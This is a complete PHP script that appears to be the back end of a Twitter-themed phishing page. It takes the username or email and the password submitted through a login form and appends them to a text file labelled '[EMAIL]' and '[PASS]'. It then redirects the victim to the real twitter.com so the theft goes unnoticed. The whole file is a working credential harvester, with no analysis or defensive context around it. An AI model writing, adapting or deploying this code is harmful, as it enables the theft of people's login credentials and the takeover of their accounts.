<?php
$var = $_POST['usernameOrEmail'];
$var2 = $_POST['pass'];
$myFile = file_get_contents("protect.html");

if($myFile) {
    file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location: https://twitter.com/');
}

exit();
?>
